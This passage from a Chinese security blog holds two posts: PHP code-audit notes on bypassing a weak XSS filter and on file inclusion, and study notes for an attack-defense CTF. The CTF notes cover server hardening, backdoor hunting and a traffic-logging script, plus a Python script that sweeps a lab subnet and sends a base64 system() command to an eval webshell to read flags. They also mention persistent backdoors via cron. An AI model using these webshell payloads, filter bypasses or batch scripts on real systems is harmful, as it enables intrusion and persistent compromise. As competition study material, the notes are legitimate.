<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">////获取浏览器header头user-agent信息</span></span><br><span class="line"><span class="comment">//echo $_SERVER[&#x27;HTTP_USER_AGENT&#x27;].&quot;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">////获取浏览器从哪个页面跳转过来的信息，Referer</span></span><br><span class="line"><span class="comment">//echo $_SERVER[&#x27;HTTP_REFERER&#x27;].&quot;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="variable">$xss</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;xss&#x27;</span>];</span><br><span class="line"><span class="variable">$xss</span> = preg_replace(<span class="string">&quot;/&lt;script&gt;/&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$xss</span>);</span><br><span class="line"><span class="variable">$xss</span> = preg_replace(<span class="string">&quot;/&lt;\/script&gt;/&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$xss</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$xss</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>利用preg_replace 进行拦截，但我们可以发现，<strong>preg_replace(“/<script>/","",$xss);<strong>此处，正则匹配表达式未开启</strong>/i</strong>忽略大小写模式，并且只是单次将恶意字符替换为空，这导致我们可以通过双写、大小写、执行其他js语句等方法绕过防护并执行xss恶意代码</p>
<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0(1).assets/image-20211024161516161.png" alt="image-20211024161516161"></p>
<p>存储型：</p>
<p>dom型</p>
<h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含:"></a>文件包含:</h4><p>文件包含有远程文件包含、本地文件包含之分。</p>
<p>远程文件包含需要在php.ini中设置，可在phpinfo中查看是否开启。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_include = on </span><br><span class="line">allow_url_fopen=on</span><br></pre></td></tr></table></figure>

<p>文件包含特征函数:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(): 使用<span class="keyword">include</span>包含文件时，只有当代码执行到<span class="keyword">include</span>时才会调用被包含的文件，当被包含的文件产生错误时，只会返回错误提醒，不会停止php文件的执行</span><br><span class="line"><span class="keyword">require</span>(): 在php页面之前，<span class="keyword">require</span>会将被包含文件整个替换进本php文件，并与原php文件拼接成一个新的php文件，之后按照新的php脚本的顺序进行执行</span><br><span class="line"><span class="keyword">include_once</span>(): 包含前进行检测，若已被本页面的其他部分包含过就不再包含</span><br><span class="line"><span class="keyword">require_once</span>():当重复调用<span class="keyword">require_once</span>包含同一文件时，php只执行一次</span><br></pre></td></tr></table></figure>

<h5 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h5><p>php文件:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;./phpinfo.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>被包含文件:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0(1).assets/image-20211024172509362.png" alt="image-20211024172509362"></p>
<p>此处可发现，文件包含可配合文件上传等功能联合食用，即使被包含的文件并非php文件也可执行代码语句</p>
<p>若包含文件路径可控，我们可根据ssh 、apache access log 投毒进行getshell操作</p>
<h5 id="远程包含："><a href="#远程包含：" class="headerlink" title="远程包含："></a>远程包含：</h5><p>当被包含的文件在远程服务器时，便形成了远程文件包含，常见触发点，网络图片处</p>
<p>需allow_url_include = on以及allow_url_fopen=on开启</p>
<p>开启参数才可进行远程文件包含</p>
</script></strong></p>
      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>











  
    <article id="post-awd知识梳理" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a  href="/2021/10/22/awd%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/" class="article-date">
      <time datetime="2021-10-22T09:02:01.000Z" itemprop="datePublished">2021-10-22</time>
</a>

    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a  class="article-title" href="/2021/10/22/awd%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/">awd知识梳理</a>
    </h1>
  


      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p>由于一个月后需要参加一项awd比赛，为了防止过去之后什么也不懂的情况发生，写下这篇笔记用于记录整理awd比赛可能会用到的一些零零碎碎的知识点。</p>
<h2 id="0X01-目录索引"><a href="#0X01-目录索引" class="headerlink" title="0X01 目录索引"></a>0X01 目录索引</h2><ol>
<li>加固阶段</li>
<li>攻防阶段</li>
</ol>
<h3 id="1-加固阶段"><a href="#1-加固阶段" class="headerlink" title="1.加固阶段"></a>1.加固阶段</h3><ol>
<li><p>修改ssh登陆密码</p>
<p>首先根据主办方提供的ssh账号登陆到我们的服务器，并在第一时间下通过passwd修改密码，最好改为强密码，避免其他队伍通过弱口令或默认口令进入我们服务器。<img src="/images/awd%E8%B5%9B%E9%A1%B9%E7%90%90%E7%A2%8E%E7%9F%A5%E8%AF%86%E7%82%B9.assets/image-20211022155257543.png" alt="image-20211022155257543"></p>
</li>
<li><p>备份mysql数据库、网站源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -uroot -p 数据库名 &gt; 备份文件 <span class="comment">#进行数据库备份</span></span><br><span class="line">source C:\User\<span class="number">86156</span>\Desktop\web\test.sql <span class="comment">#进入数据库，将数据库备份文件导入</span></span><br><span class="line">tar -czvf 打包文件.tar.gz  打包目录 </span><br><span class="line">tar -zxvf 打包文件  <span class="comment">#解压打包文件</span></span><br><span class="line">利用python3 -m http.server <span class="number">8080</span>| python -m SimpleHTTPServer <span class="number">8080</span>|scp 命令将文件传输至本机进行审计</span><br><span class="line">   </span><br></pre></td></tr></table></figure></li>
<li><p>进入web主目录审计源码，查找隐藏后门文件以及webshell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls -al #列出目录内所有文件，避免.xxx.php 从而被隐藏后门文件。</span><br><span class="line">crontab -e #查看计划任务表</span><br><span class="line">cat /etc/crontab </span><br></pre></td></tr></table></figure>

<p><img src="/images/awd%E8%B5%9B%E9%A1%B9%E7%90%90%E7%A2%8E%E7%9F%A5%E8%AF%86%E7%82%B9.assets/image-20211022161419311.png" alt="image-20211022161419311"></p>
</li>
<li><p>利用find | xrags grep “xxx” 粗略查找网站中的隐藏后门，找到后对其进行删除操作</p>
</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find /<span class="keyword">var</span>/www/html |xargs grep <span class="string">&quot;system&quot;</span> </span><br><span class="line"><span class="comment">#system、eval、assert、exec、passthru、shell_exec都要留心查一下</span></span><br><span class="line"><span class="comment">#include、require、include_once 、require_once等包含函数也可留意</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/awd%E8%B5%9B%E9%A1%B9%E7%90%90%E7%A2%8E%E7%9F%A5%E8%AF%86%E7%82%B9.assets/image-20211022161723171.png" alt="image-20211022161723171"></p>
<p>​            5.后门排查完毕后，对代码进行审计，重点查看upload以及sql，若主办方还提供D盾等排查后门工具，可一起利用d盾进行后门排查</p>
<p><img src="/images/awd%E8%B5%9B%E9%A1%B9%E7%90%90%E7%A2%8E%E7%9F%A5%E8%AF%86%E7%82%B9.assets/image-20211022163226399.png" alt="image-20211022163226399"></p>
<h3 id="2-攻防阶段"><a href="#2-攻防阶段" class="headerlink" title="2.攻防阶段"></a>2.攻防阶段</h3><p>1安排上流量监控脚本，筛选其他攻击队的可利用payload放入自己武器库之中</p>
<p>使用时需要将waf.php include包含进文件之中。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">define(<span class="string">&#x27;LOG_FILEDIR&#x27;</span>,<span class="string">&#x27;./logs&#x27;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!function_exists(<span class="string">&#x27;getallheaders&#x27;</span>)) &#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getallheaders</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_SERVER</span> <span class="keyword">as</span> <span class="variable">$name</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (substr(<span class="variable">$name</span>, <span class="number">0</span>, <span class="number">5</span>) == <span class="string">&#x27;HTTP_&#x27;</span>)</span><br><span class="line"><span class="variable">$headers</span>[str_replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;-&#x27;</span>, ucwords(strtolower(str_replace(<span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27; &#x27;</span>, substr(<span class="variable">$name</span>, <span class="number">5</span>)))))] = <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$headers</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$get</span> = <span class="variable">$_GET</span>;</span><br><span class="line"><span class="variable">$post</span> = <span class="variable">$_POST</span>;</span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_COOKIE</span>;</span><br><span class="line"><span class="variable">$header</span> = getallheaders();</span><br><span class="line"><span class="variable">$files</span> = <span class="variable">$_FILES</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>];</span><br><span class="line"><span class="variable">$method</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>];</span><br><span class="line"><span class="variable">$filepath</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_NAME&quot;</span>];</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_FILES</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line"><span class="variable">$files</span>[<span class="variable">$key</span>][<span class="string">&#x27;content&#x27;</span>] = file_get_contents(<span class="variable">$_FILES</span>[<span class="variable">$key</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">file_put_contents(<span class="variable">$_FILES</span>[<span class="variable">$key</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&quot;virink&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$header</span>[<span class="string">&#x27;Accept&#x27;</span>]);</span><br><span class="line"><span class="variable">$input</span> = <span class="keyword">array</span>(<span class="string">&quot;Get&quot;</span>=&gt;<span class="variable">$get</span>, <span class="string">&quot;Post&quot;</span>=&gt;<span class="variable">$post</span>, <span class="string">&quot;Cookie&quot;</span>=&gt;<span class="variable">$cookie</span>, <span class="string">&quot;File&quot;</span>=&gt;<span class="variable">$files</span>, <span class="string">&quot;Header&quot;</span>=&gt;<span class="variable">$header</span>);</span><br><span class="line"></span><br><span class="line">logging(<span class="variable">$input</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logging</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"><span class="variable">$LOG_FILENAME</span> = LOG_FILEDIR.<span class="string">&quot;/&quot;</span>.<span class="variable">$filename</span>;</span><br><span class="line"><span class="variable">$time</span> = date(<span class="string">&quot;Y-m-d G:i:s&quot;</span>);</span><br><span class="line">file_put_contents(<span class="variable">$LOG_FILENAME</span>, <span class="string">&quot;\r\n&quot;</span>.<span class="variable">$time</span>.<span class="string">&quot;\r\n&quot;</span>.print_r(<span class="variable">$var</span>, <span class="literal">true</span>), FILE_APPEND);</span><br><span class="line">file_put_contents(<span class="variable">$LOG_FILENAME</span>,<span class="string">&quot;\r\n&quot;</span>.<span class="string">&#x27;http://&#x27;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>].<span class="string">&#x27;?&#x27;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>], FILE_APPEND);</span><br><span class="line">file_put_contents(<span class="variable">$LOG_FILENAME</span>,<span class="string">&quot;\r\n***************************************************************&quot;</span>,FILE_APPEND);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">waf();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">   </span><br></pre></td></tr></table></figure>

<p>同时可联用apache、nginx的日志文件，通过grep筛查拿到可利用payload</p>
<p>2.根据后门文件写批量拿flag脚本，人菜写的脚本烂，诸位师傅别骂哈</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line"><span class="comment">###  目前需求如下：</span></span><br><span class="line"><span class="comment"># 1，第一遍拿到存活主机并尝试通过get方式拿到flag，并将flag存入文件内</span></span><br><span class="line"><span class="comment"># 2. 回显为空的，将存活Ip放入一个Post_url列表中，再在下方通过post_getflag方式走一遍流程，尝试拿flag</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#利用Get请求方式请求flag</span></span><br><span class="line"></span><br><span class="line">def get_flag(url,payload,flag,header):</span><br><span class="line">    <span class="keyword">for</span> i in range(<span class="number">1</span>,<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;开始探测:&quot;</span>,url.format(i))</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res = requests.get(url.format(i),params=payload,timeout=<span class="number">2</span>,headers=header)</span><br><span class="line">            res.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&quot;状态码:&quot;</span>,res.status_code)</span><br><span class="line">            <span class="keyword">if</span> (flag in str(res.text)):</span><br><span class="line">                <span class="keyword">print</span>(<span class="string">&quot;Get flag successful!&quot;</span>)</span><br><span class="line">                f = open(<span class="string">&quot;getflag.txt&quot;</span>, mode=<span class="string">&quot;a&quot;</span>)</span><br><span class="line">                f.write(res.text)</span><br><span class="line">                f.close()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> (res.status_code == <span class="number">200</span>):</span><br><span class="line">                    post_urls.append(url.format(i))</span><br><span class="line">                    <span class="comment"># f = open(&quot;Post_getflag.txt&quot;, mode=&quot;a&quot;)</span></span><br><span class="line">                    <span class="comment"># #利用\r\n将写入的数据换行</span></span><br><span class="line">                    <span class="comment"># f.write(url.format(i)+&quot;\r&quot;)</span></span><br><span class="line">                    <span class="comment"># f.close()</span></span><br><span class="line"></span><br><span class="line">        except requests.RequestException <span class="keyword">as</span> e:</span><br><span class="line">            e</span><br><span class="line"></span><br><span class="line"><span class="comment">#POST抓取flag</span></span><br><span class="line">def post_Getflag(payload,flag):</span><br><span class="line">    data=&#123;&#125;</span><br><span class="line">    data[<span class="string">&#x27;pass&#x27;</span>]=<span class="string">&quot;c3lzdGVtKCJtb3JlIGZsYWcudHh0Iik7&quot;</span></span><br><span class="line">    <span class="keyword">for</span> url in post_urls:</span><br><span class="line">        <span class="keyword">print</span>(url)</span><br><span class="line">        res = requests.post(url,data=data,timeout=<span class="number">2</span>)</span><br><span class="line">        res.encoding=<span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">        <span class="keyword">print</span>(res.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#@eval(base64_decode($_POST[pass]));    一句话木马</span></span><br><span class="line"><span class="comment">#system(&quot;more flag.txt&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment">#开始嗨皮</span></span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">#此处偷了个懒，默认按照192.168.155.0/24段内的主机是awd内网靶机环境</span></span><br><span class="line">    url = <span class="string">&quot;http://192.168.155.&#123;0&#125;/pcap.php&quot;</span></span><br><span class="line">    payload = <span class="string">&quot;&quot;</span><span class="string">&quot;c3lzdGVtKCJtb3JlIGZsYWcudHh0Iik7&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    flag = <span class="string">&quot;flag&#123;&quot;</span></span><br><span class="line">    post_urls=[]</span><br><span class="line">    get_flag(url,payload,flag,header)</span><br><span class="line">    post_Getflag(payload,flag,header)</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;完成！&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>在获取flag的时候，还可以通过写入不死马、计划任务上马等手段进行权限维持，避免后门被清理无法再下轮flag投放时获取不到。</p>
<p>简单来说，攻防阶段主要是快速编写批量爆破flag脚本并运行读取，另外根据日志或流控脚本发现其他未修复漏洞进行及时修复避免失分。</p>
<p>今天先更新到这里，以后如果还有其他内容还会陆续更新本文….</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>











  
  
    <nav id="page-nav">
      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
    </nav>
  

</div>
      <footer id="footer">
    <div class="outer">
        <div id="footer-info">
            <div class="footer-left">
                &copy; 2021 Nayon|1163875625@qq.com
            </div>
            <div class="footer-right">
                <a href="http://hexo.io/" target="_blank">Hexo &nbsp;&nbsp;</a><a href="https://github.com/maochunguang" target="_blank">Blog</a> by tommy
            </div>
        </div>
        
            <div class="visit">
                
                    <span id="busuanzi_container_site_pv" style='display:none'>
                        <span id="site-visit" >极客到访数: 
                            <span id="busuanzi_value_site_uv"></span>
                        </span>
                    </span>
                
                
                    <span>, </span>
                
                
                    <span id="busuanzi_container_page_pv" style='display:none'>
                        <span id="page-visit">本页阅读量: 
                            <span id="busuanzi_value_page_pv"></span>
                        </span>
                    </span>
                
            </div>
        
    </div>
</footer>

    </div>
    
<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>


<script src="/js/main.js"></script>


    <script>
        $(document).ready(function() {
            var backgroundnum = 1;
            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
        })
    </script>


<!-- Google Analytics -->
<script type="text/javascript">
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');

ga('create', 'xxxxx', 'auto');
ga('send', 'pageview');

</script>
<!-- End Google Analytics -->



	<script>
	var _hmt = _hmt || [];
	(function() {
	  var hm = document.createElement("script");
	  hm.src = "//hm.baidu.com/hm.js?xxxxxx";
	  var s = document.getElementsByTagName("script")[0]; 
	  s.parentNode.insertBefore(hm, s);
	})();
	</script>



<div class="scroll" id="scroll">
    <a href="#"><i class="fa fa-arrow-up"></i></a>
    <a href="#comments"><i class="fa fa-comments-o"></i></a>
    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    $(document).ready(function() {
        if ($("#comments").length < 1) {
            $("#scroll > a:nth-child(2)").hide();
        };
    })
</script>

<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
</script>

  <script language="javascript">
    $(function() {
        $("a[title]").each(function() {
            var a = $(this);
            var title = a.attr('title');
            if (title == undefined || title == "") return;
            a.data('title', title).removeAttr('title').hover(
            function() {
                var offset = a.offset();
                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
                    top: offset.top - a.outerHeight() - 15,
                    left: offset.left + a.outerWidth()/2 + 1
                }).fadeIn(function() {
                    var pop = $(this);
                    setTimeout(function() {
                        pop.remove();
                    }, pop.text().length * 800);
                });
            }, function() {
                $("#anchortitlecontainer").remove();
            });
        });
    });
</script>


  </div>
</body>
</html>